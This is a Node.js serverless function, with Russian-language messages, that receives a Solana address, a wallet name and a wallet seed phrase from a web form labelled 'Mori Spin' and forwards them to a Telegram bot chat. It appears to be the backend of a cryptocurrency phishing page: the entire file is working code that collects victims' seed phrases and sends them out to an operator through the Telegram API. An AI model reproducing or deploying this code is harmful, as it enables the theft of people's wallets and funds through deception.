const https = require('https');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    const { BOT_TOKEN, CHAT_ID } = process.env;

    if (!BOT_TOKEN || !CHAT_ID) {
        return { 
            statusCode: 500, 
            body: JSON.stringify({ message: "Переменные окружения не настроены на сервере." }) 
        };
    }

    try {
        const data = JSON.parse(event.body);
        const { solAddress, wallet, seedPhrase } = data;

        if (!solAddress || !wallet || !seedPhrase) {
            return {
                statusCode: 400,
                body: JSON.stringify({ message: "Отсутствуют необходимые данные." })
            };
        }

        const escapeHTML = (str) => {
            return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        };

        const message = `
<b>🔔 Новая заявка | Mori Spin</b>

<b>Кошелёк:</b> ${escapeHTML(wallet)}
<b>SOL Адрес:</b> <code>${escapeHTML(solAddress)}</code>

<b>Сид фраза:</b>
<pre>${escapeHTML(seedPhrase)}</pre>
        `;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const postData = JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });

        await new Promise((resolve, reject) => {
            const req = https.request(url, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json', 
                    'Content-Length': Buffer.byteLength(postData) 
                }
            }, (res) => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    resolve(res);
                } else {
                    res.on('data', (chunk) => console.error('Telegram API Error:', chunk.toString()));
                    reject(new Error(`Ошибка ответа Telegram: ${res.statusCode}`));
                }
            });
            req.on('error', reject);
            req.write(postData);
            req.end();
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Успешно отправлено" })
        };

    } catch (error) {
        console.error('Ошибка выполнения функции:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: `Внутренняя ошибка сервера: ${error.message}` })
        };
    }
};